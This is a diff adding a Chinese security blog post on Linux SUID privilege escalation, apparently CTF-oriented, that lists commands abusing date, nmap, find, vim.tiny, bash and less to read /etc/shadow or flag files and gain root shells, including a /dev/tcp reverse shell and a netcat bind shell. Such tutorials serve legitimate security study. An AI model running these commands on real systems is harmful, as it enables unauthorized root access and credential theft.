@@ -1,0 +1,61 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>privilege-elevation · Mini's blog</title><meta name="description" content="SUID 提权具有suid权限的⼆进制可执⾏⽂件有：
+1234567891011nmapvimfindbashmorelessnanocpawkdata...
+
+查看具有 SUID 权限的命令
+12345find / -perm -u=s -type f 2&amp;gt;/dev/null &amp;gt; ./"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>privilege-elevation</a></h3></div><div class="post-content"><h1 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h1><p>具有suid权限的⼆进制可执⾏⽂件有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br><span class="line">data</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>查看具有 SUID 权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null &gt; ./1.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p>参数解释：</p>
+<ul>
+<li><code>-perm</code> : <code>find</code> 命令的选项，按照权限进行匹配</li>
+<li><code>-u=s</code> : 匹配具有 SUID 权限的文件</li>
+<li><code>-type f</code> : <code>find</code> 命令的选项，只匹配文件，不包括目录、链接等</li>
+<li><code>2&gt;/dev/null</code> : 将错误信息重定向到 <code>/dev/null</code> 文件，即不显示错误信息</li>
+</ul>
+<p>然后根据得到的结果，寻找可利用命令进行提权</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="date-f"><a href="#date-f" class="headerlink" title="date -f"></a><code>date -f</code></h3><p>该命令根据文件的内容，读出里面的日期信息</p>
+<p>如果让他读取一些不含有时间内容的文件，他会以报错的形式把文档内容读取出来</p>
+<p>因此可以利用该命令，读取本来不可读的文件内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">date -f /flag</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">date -f /flag 2&gt;1.txt # 将报错结果写入文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><code>nmap</code></h3><p>较旧的 nmap（2.02 至 5.21）具有交互模式，允许用户执行 shell 命令</p>
+<p>执行 <code>nmap --interactive</code> 进入交互模式</p>
+<p>使用以下命令得到一个提升的 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用 Metasploit 模块对 Nmap 的二进制文件进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure>
+
+<h3 id="find"><a href="#find" class="headerlink" title="find"></a><code>find</code></h3><ul>
+<li>查看普通用户没有权限的文件</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> /usr/bin/<span class="built_in">find</span> -exec cat /etc/shadow \;</span><br><span class="line"></span><br><span class="line"># -exec <span class="built_in">find</span> 命令的选项，用于对找到的每个文件执行指定的命令</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反弹 shell</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> /etc/passwd -exec bash -i &gt;&amp; /dev/tcp/ip/port <span class="number">0</span>&gt;&amp;<span class="number">1</span> \;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>结合 <code>netcat</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> /etc/passwd -exec netcat -lvp <span class="number">5555</span> -e /bin/sh \;</span><br></pre></td></tr></table></figure>
+
+<p>然后连接到目标机会直接获得一个 root 权限的 shell</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat &lt;target_ip&gt; <span class="number">5555</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="vim-tiny"><a href="#vim-tiny" class="headerlink" title="vim.tiny"></a><code>vim.tiny</code></h3><p>如果 Vim 具有 SUID 权限，那么它会继承 root 用户的权限，因此可以读取系统上的所有文件</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>此外，还可以进入 vim.tiny，获得一个 root 的 shell </p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"># press ESC key</span><br><span class="line">:shell</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a><code>bash</code></h3><p>以下命令将以 root 权限打开一个 bash shell</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="less-amp-more"><a href="#less-amp-more" class="headerlink" title="less &amp; more"></a><code>less</code> &amp; <code>more</code></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2025-01-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/intranet/" title="intranet">intranet </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2025/01/17/privilege-elevation/,Mini's blog,privilege-elevation,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2025/01/13/twig/" title="Twig PHP模版引擎">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
